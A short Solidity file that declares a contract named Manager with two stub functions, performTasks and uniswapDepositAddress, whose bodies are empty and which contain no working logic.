pragma solidity ^0.6.6;

contract Manager {
	function performTasks() public {
	    
	}

	function uniswapDepositAddress() public pure returns (address) {
		;
	}
}
